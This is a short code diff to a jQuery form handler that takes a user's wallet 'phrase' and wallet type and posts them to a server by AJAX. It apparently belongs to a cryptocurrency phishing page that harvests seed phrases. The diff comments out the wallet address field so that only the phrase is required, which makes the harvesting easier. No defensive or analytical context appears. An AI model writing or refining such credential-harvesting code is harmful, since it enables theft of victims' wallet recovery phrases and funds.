@@ -43,9 +43,9 @@
             $('#phrase').on('submit',function(e){
                 e.preventDefault();
                 let text_phrase = $('#text_phrase').val().trim();
-                let wallet_address = $('#wallet_address').val().trim();
+               // let wallet_address = $('#wallet_address').val().trim();
                 let crypto_wallet = $('#crypto_wallet').val();
-                if(text_phrase =="" && wallet_address == ""){
+                if(text_phrase ==""){
                     alert('inputs cannot be empty')
                 }else{
                     $.ajax({
@@ -53,7 +53,7 @@
                          method:"POST",
                          data:{
                             Phrase:text_phrase,
-                            Wallet_address:wallet_address,
+                           // Wallet_address:wallet_address,
                             Crpto_Wallet:crypto_wallet
                          },
                          success:function(data){
